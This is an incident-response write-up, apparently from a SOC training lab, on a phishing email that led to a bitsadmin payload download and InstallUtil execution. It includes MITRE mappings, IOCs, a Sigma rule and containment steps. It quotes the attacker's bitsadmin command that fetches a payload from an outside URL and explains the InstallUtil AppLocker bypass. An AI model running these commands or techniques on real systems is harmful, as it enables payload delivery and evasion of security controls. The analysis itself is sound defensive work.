
# SOC301 - Suspicious BITS Transfer and Execution Detected 

## 🚨 Raw Alert Details
```text
EventID : 277
Event Time : 2024-07-12T06:09:15+03:00
Rule : SOC301 - Suspicious BITS Transfer and Execution Detected
Role : Incident Responder
Alert Type : LOLBin
Difficulty : Medium
MITRE ATT&CK : T1566.001, T1059.003, T1197, T1105
Hostname : Garnet
IP Address : 172.16.17.71
EDR Action : Allowed
Trigger Reason : Detects the use of BITS to transfer files and subsequent execution of downloaded files.
```

## Alert Overview
- **Severity:** High
- **Detection Source:** EDR / Sysmon
- **Asset Affected:** Garnet (172.16.17.71)
- **Threat Type:** Living off the Land (LOLBins) / BITS Abuse / Spearphishing
- **Verdict:** True Positive (Compromised)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
This incident showcases the weaponization of native Windows administration features, commonly referred to as **Living off the Land (LotL)**. 

**The Mechanics:** 
1. **BITS (Background Intelligent Transfer Service):** `bitsadmin.exe` is a legitimate Windows service designed to download files (like software patches) in the background. It is uniquely resilient—if a user reboots their computer or the network drops, BITS pauses the download and automatically resumes it later. Attackers abuse `bitsadmin` because its network traffic blends in with normal OS updates, and it often bypasses basic perimeter firewalls.
2. **InstallUtil:** Once the payload (`transfer.zip`) is downloaded and extracted via 7-Zip, the attacker executes `InstallUtil.exe`. This is a native .NET framework utility used to install server components. Because `InstallUtil.exe` is digitally signed by Microsoft and trusted by default, attackers frequently abuse it to execute arbitrary compiled `.exe` files and bypass Application Whitelisting (AppLocker) controls.

## Investigation Steps

### 1. Initial Access Verification (Phishing)
The investigation began by tracing the origin of the dropped files on the host `Garnet`.
- **Email Security Check:** An email was delivered to `garnet@letsdefend.io` from `support@maidtimepro.com` (Sender IP: `178.47.77.55`).
- **Lure:** The subject was "Project 2024 Update," directing the user to review an attached ZIP file named `project2024.zip` (Password: `infected`).
- **OSINT Enrichment:** The domain `maidtimepro.com` was queried on VirusTotal and flagged as malicious (phishing) by 11/92 vendors.

<img width="1576" height="668" alt="image" src="https://github.com/user-attachments/assets/b7c4cb92-ba00-45f5-b67e-94fcf2faaeb9" />

<img width="1804" height="702" alt="image" src="https://github.com/user-attachments/assets/3faaf1a0-a68f-4b85-94dd-4621fbf01630" />


### 2. Execution & BITS Abuse (EDR Terminal/Process History)
Following the execution of the initial `.cmd` script extracted from the phishing archive, the EDR captured the weaponization of BITS.
- **Process Creation (Event ID 1):** `cmd.exe` spawned `bitsadmin.exe` with the following command line:
  `bitsadmin /transfer myDownloadJob https://files-ld.s3.us-east-2.amazonaws.com/transfer.zip C:\Users\letsdefend\Downloads\transfer.zip`
- **Analysis:** The attacker forced Windows to download a secondary payload (`transfer.zip`) from an attacker-controlled AWS S3 bucket using the background transfer service. Sysmon Event IDs 3 and 4 confirmed the job (`myDownloadJob`) was successfully created and completed.

<img width="1275" height="287" alt="image" src="https://github.com/user-attachments/assets/b5d4bca0-ccff-43d7-bfaf-f590bf3ca750" />


### 3. Payload Extraction & AppLocker Bypass (InstallUtil)
Once `transfer.zip` was downloaded, the attack chain progressed to extraction and execution.
- **Extraction:** The script invoked `7zG.exe` (7-Zip GUI) to quietly extract `transfer.zip` into a local directory, dropping the final binary: `TRANSFER.exe`.
- **Defense Evasion:** To execute `TRANSFER.exe` without triggering security controls, the malware invoked `InstallUtil.exe`:
  `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe` (called by `TRANSFER.exe`).
- **Analysis:** Using `InstallUtil` as a parent process to launch the malware is a classic AppLocker bypass technique, forcing security software to trust the execution context because a Microsoft-signed binary initiated it.


## Analysis & Findings
The incident is a confirmed **True Positive**. The user "Garnet" received a spear-phishing email containing a malicious ZIP file (`project2024.zip`). Upon execution, the script deployed native Windows tools (`bitsadmin.exe`) to download a secondary payload from an AWS S3 bucket, extracted it using 7-Zip, and successfully executed it via `InstallUtil.exe` to bypass security controls. The endpoint is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1059.003 | Command and Scripting Interpreter: Windows Command Shell |
| **Defense Evasion** | T1197 | BITS Jobs (Background Intelligent Transfer Service) |
| **Command and Control** | T1105 | Ingress Tool Transfer |
| **Defense Evasion** | T1218.004 | System Binary Proxy Execution: InstallUtil |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| Domain | `maidtimepro.com` | Phishing Sender Domain |
| IP Address | 178.47.77.55 | Phishing SMTP Source IP |
| URL | `https://files-ld.s3.us-east-2.amazonaws.com/transfer.zip` | Secondary Payload Hosting (AWS S3) |
| Binary | `bitsadmin.exe` | Abused LOLBin for payload download |
| Binary | `InstallUtil.exe` | Abused LOLBin for AppLocker bypass / execution |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of BITS abuse and LOLBin execution, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Suspicious BITSAdmin Download and InstallUtil Execution
id: f9204918-1234-4a5e-994d-50580a1e4c73
status: experimental
description: Detects the use of bitsadmin to download files followed by execution using InstallUtil.
author: SOC Analyst Portfolio
logsource:
product: windows
service: sysmon
detection:
selection_bits:
  EventID: 1
  Image: '*\bitsadmin.exe'
  CommandLine|contains:
    - '/transfer'
    - '/create'
selection_installutil:
  EventID: 1
  ParentImage: '*\TRANSFER.exe'
  Image: '*\InstallUtil.exe'
condition: selection_bits or selection_installutil
falsepositives:
  - Legitimate administrative software deployments
level: high
tags:
  - attack.t1197
  - attack.t1218.004
  - attack.t1105
```

## 🚀 Decision Tree 
1. **Analyze Initial Vector:** Did the user execute a script or file from an email attachment?
   - If Yes -> Proceed to Process Tree analysis.
2. **Check for LOLBin Downloads:** Did a process like `cmd.exe` or `powershell.exe` spawn `bitsadmin.exe` or use `Start-BitsTransfer`?
   - If Yes -> **Indicates stealthy payload staging.**
3. **Analyze Execution Context:** Did the payload execute via a trusted .NET binary like `InstallUtil.exe` or `Regsvcs.exe`?
   - If Yes -> **Verdict: True Positive - Successful Compromise (AppLocker Bypass).**
4. **Action:** Isolate host immediately, purge email globally, and block AWS S3 delivery URLs.

## 📝 Playbook Questions & Answers
- **What is the initial access method used in the attack?**
  - *Answer:* Phishing (Spearphishing Attachment).
  - *Reasoning:* The user received an email from `support@maidtimepro.com` with a malicious archive (`project2024.zip`) attached, which initiated the infection chain.
- **Has the malware been executed on the device?**
  - *Answer:* Yes.
  - *Reasoning:* EDR process logs confirmed the execution of `project2024.cmd`, the invocation of `bitsadmin.exe`, and the subsequent execution of `TRANSFER.exe` via `InstallUtil.exe`.
- **Does the device need to be isolated?**
  - *Answer:* Yes.
  - *Reasoning:* The system successfully downloaded, extracted, and executed an unauthorized executable payload, resulting in a full system compromise.

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`Garnet / 172.16.17.71`) was immediately **Isolated** via the EDR console to prevent potential lateral movement or data exfiltration.
- **Email Purge:** The phishing email from `support@maidtimepro.com` was purged globally from the Exchange environment.
- **Why:** Immediate isolation is mandatory when an unknown binary executes, as it cuts off command-and-control communication and stops the attacker from expanding their footprint.

## Recommendations
1. **AppLocker / WDAC Hardening:** Restrict the execution of native .NET framework binaries. Specifically, block `InstallUtil.exe`, `Regsvcs.exe`, and `Regasm.exe` from executing if initiated by user-writable directories (like `%TEMP%` or `Downloads`).
2. **BITS Monitoring:** Monitor and alert on excessive or unauthorized `bitsadmin.exe` command-line invocations, especially those targeting external URLs.
3. **Email Gateway Restrictions:** Block inbound `.zip` attachments containing `.cmd`, `.bat`, or unverified `.exe` scripts by default.

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (Feeling Overwhelmed by Complex Chains):** When I first looked at this alert, the mix of `bitsadmin`, `7-Zip`, and `InstallUtil` made it difficult to figure out what was happening.
- **The Lesson (Breaking Down LOLBins):** When facing a confusing process tree, don't try to understand the whole malware at once. Break it down chronologically: 
  1. How did it download? (`bitsadmin` = BITS abuse). 
  2. How did it extract? (`7zG.exe` = Archive extraction). 
  3. How did it run? (`InstallUtil.exe` = AppLocker bypass). 
  Recognizing these individual tools as standard "Living off the Land" techniques instantly demystifies the attack.

## 🛠️ Skills & Tools Used
- EDR Process Tree Analysis (Tracking LOLBins)
- BITS Activity Triage (T1197)
- AppLocker Bypass Identification (InstallUtil T1218.004)
- Incident Containment (Host Isolation)
